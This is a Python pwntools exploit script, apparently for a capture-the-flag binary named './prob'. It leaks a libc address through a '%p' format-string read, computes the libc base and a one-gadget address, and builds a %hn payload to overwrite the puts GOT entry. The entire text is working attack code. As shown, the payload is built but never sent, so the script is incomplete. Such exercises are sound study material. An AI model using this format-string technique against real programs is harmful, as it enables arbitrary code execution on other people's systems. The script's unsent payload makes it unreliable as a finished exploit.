from pwn import *
p = process("./prob")
elf = ELF("./prob")
libc = elf.libc

def fmt(prev , target):
	if prev < target:
		result = target - prev
		return "%" + str(result)  + "c"
	elif prev == target:
		return ""
	else:
		result = 0x10000 + target - prev
		return "%" + str(result) + "c"

def fmt64(offset , target_addr , target_value , prev = 0):
	payload = ""
	for i in range(3):
		payload += p64(target_addr + i * 2)
	payload2 = ""
	for i in range(3):
		target = (target_value >> (i * 16)) & 0xffff 
		payload2 += fmt(prev , target) + "%" + str(offset + 8 + i) + "$hn"
		prev = target
	payload = payload2.ljust(0x40 , "a") + payload
	return payload

if __name__ == "__main__":
	p.sendlineafter("> ", "%p")
	pause()
	p.recvuntil("Your Question is...\n")
	__IO_2_1_stdout = int(p.recv(14), 16) - 131
	libc_base = __IO_2_1_stdout - libc.symbols['_IO_2_1_stdout_']
	oneshot = libc_base + 0x4f3d5
	p.success("__IO_2_1_stdout_ : " + hex(__IO_2_1_stdout))
	p.success("libc_base : " + hex(libc_base))
	p.success("oneshot : " + hex(oneshot))
	sleep(0.1)
	payload = fmt64(7, elf.got['puts'], oneshot)
	p.interactive()
